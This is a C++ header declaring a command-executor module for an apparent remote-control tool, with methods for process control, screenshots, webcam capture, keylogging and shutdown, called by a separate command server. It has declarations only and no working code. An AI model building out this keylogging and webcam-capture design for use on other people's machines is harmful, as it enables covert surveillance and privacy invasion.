#pragma once

#include "ICommandExecutor.h" // Include the interface ("contract") that this class implements
#include <string>
#include <vector>
#include <cstdint>

/**
 * @brief Concrete implementation of the ICommandExecutor interface.
 *
 * This class represents "Module 2" — the component responsible for executing 
 * all system-level operations such as process management, application control,
 * keylogging, screen/webcam capture, shutdown/restart, etc.
 *
 * Module 1 (CommandServer) will call these methods after parsing incoming
 * commands from the client.
 */
class CommandExecutor : public ICommandExecutor {
public:
    // --- Application Management ---
    std::string ListApplications() override;
    void StartApplication(const std::string& applicationName) override;
    void KillApplication(const std::string& applicationIdOrName) override;

    // --- Process Management ---
    std::string ListProcess() override;
    void StartProcess(const std::string& processName) override;
    void KillProcess(const std::string& processIdOrName) override;

    // --- Screen Capture ---
    std::vector<uint8_t> PrintScreen() override;

    // --- Keylogger ---
    void StartKeyLogging() override;
    std::string GetLoggedKeys() override;

    // --- Webcam Capture / Video ---
    std::vector<uint8_t> Capture() override;

    // --- System Control ---
    void Shutdown() override;
    void Restart() override;

private:
    /**
     * @brief Helper function used to execute a shell command
     *        and return its output as a string.
     *
     * @param cmd The full shell command (e.g., "tasklist", "ps aux").
     * @return The console output produced by the executed command.
     */
    std::string executeShellCommand(const char* cmd);
    
    // Additional private helper functions can be implemented here.
    // Example: std::vector<uint8_t> executeCaptureCommand(...);
    // 3 hàm phức tạp cần hàm helper thì để dưới này nhé.
};